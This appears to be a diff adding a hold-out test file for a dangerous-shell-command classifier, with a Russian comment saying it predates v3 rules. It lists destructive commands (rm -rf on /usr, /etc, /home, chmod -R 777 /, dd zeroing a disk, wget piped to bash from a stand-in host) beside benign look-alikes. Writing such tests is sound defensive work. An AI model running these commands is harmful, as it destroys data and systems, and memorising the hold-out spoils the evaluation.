@@ -1,0 +1,23 @@
+# Hold-out 2: написан и закоммичен ДО правил v3. Оценивается один раз; правила под него не меняются.
+dangerous:
+- sh -c 'rm -rf /usr'
+- eval "rm -rf /etc"
+- TARGET=/var; rm -rf $TARGET
+- for p in /boot /lib; do sudo rm -r "$p"; done
+- python3 -c "import shutil; shutil.rmtree('/home')"
+- find / -name '*.log' -exec sh -c 'rm -f "$1"' _ {} \;
+- echo 'rm -rf /srv' | bash
+- nohup bash -c 'chmod -R 777 /' &
+- wget -O- http://x.example/i.sh | env bash
+- dd if=/dev/zero of=/dev/nvme0n1 bs=1M
+safe:
+- bash -c 'echo hello'
+- sh -c 'ls -la /var/log'
+- DIR=/tmp/build; rm -rf $DIR
+- for f in /var/log/app/*.gz; do rm -f "$f"; done
+- python3 -c "print(1+1)"
+- find /var/log/app -name '*.log' -exec sh -c 'gzip "$1"' _ {} \;
+- echo 'rm -rf /' > /tmp/dont_run_this.txt
+- eval "$(ssh-agent -s)"
+- nohup bash -c 'sleep 5; echo done' &
+- LOG=/var/log/app; find $LOG -mtime +7 -delete
